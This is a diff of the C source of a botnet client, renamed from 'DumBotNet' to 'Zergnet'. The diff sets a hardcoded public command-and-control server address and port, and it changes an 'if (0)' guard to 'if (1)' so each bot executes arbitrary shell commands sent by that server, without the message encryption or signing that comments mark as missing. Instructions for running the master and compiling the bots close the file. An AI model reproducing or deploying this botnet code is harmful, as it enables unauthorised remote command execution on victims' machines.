@@ -1,19 +1,19 @@
 /*
- * This file is part of DumBotNet.
- * Copyright (c) David Martinez Oliveira 2016
+ * This file is part of Zergnet.
+ * Copyright (c) Freddy Iniguez & Carlos Naal 2016
  *
- * DumBotNet is free software: you can redistribute
+ * Zergnet is free software: you can redistribute
  * it and/or modify it under the terms of the GNU General Public License
  * as published by the Free Software Foundation, either version 3
  * of the License, or (at your option) any later version.
  *
- * DumBotNet is distributed in the hope that it will be useful,
+ * Zergnet is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  * GNU General Public License for more details.
  *
  * You should have received a copy of the GNU General Public License
- * along with DumBotNet.  If not, see <http://www.gnu.org/licenses/>.
+ * along with Zergnet.  If not, see <http://www.gnu.org/licenses/>.
  *
  */
 
@@ -27,12 +27,8 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-// Zergnet IP address:
-// #define CC_SERVER "159.203.130.71"
-
-// Local IP address for testing:
-#define CC_SERVER "192.168.1.145"
-
+// Zergnet IP address and port:
+#define CC_SERVER "104.236.224.88"
 #define CC_PORT 9999
 #define MAX_BUF 1024
 
@@ -58,7 +54,7 @@ int bot_print (int s, char *str){
 int bot_read (int s, char *msg){
   memset (msg, 0, MAX_BUF);
   if (read (s, msg, MAX_BUF)  <= 0) PEXIT ("bot_read:");
-  printf ("+ MESSAGE RECEIVED AND ENCRYPTED: '%s'\n", msg);					// -----Encrypt or sign the message-----
+  // -------- WARNING: ENCRYPTH AND SIGN THE MESSAGE HERE --------
   return 0;
 }
 
@@ -101,9 +97,9 @@ int bot_parse (int s, char *msg){
   if (strcasecmp (target, "all") && strcasecmp(target, bot_id))
     return 0; // Silently ignore messages not for us
     
-  // -----Decrypt the message and checksum-----
+  // -------- WARNING: DECRYPTH AND SIGN THE MESSAGE HERE --------
     
-  if (0){
+  if (1){
 	  printf ("+ Executing command: '%s'\n", cmd);
       bot_run_cmd (s, cmd);
       return 0;
@@ -154,9 +150,9 @@ int main (int argc, char* argv[]){
   }
 }
 
-// ===== BOT "Ended notes" =====
+// ===== BOT "End notes" =====
 // >>> To run the master:
 // nk -hub -s T,9999
 
 // >>> To run the bots (with the RSA method):
-// gcc -o bot bot.c BotName -L/usr/lib -lssl -lcrypto
+// gcc -o bot bot.c -L/usr/lib -lssl -lcrypto
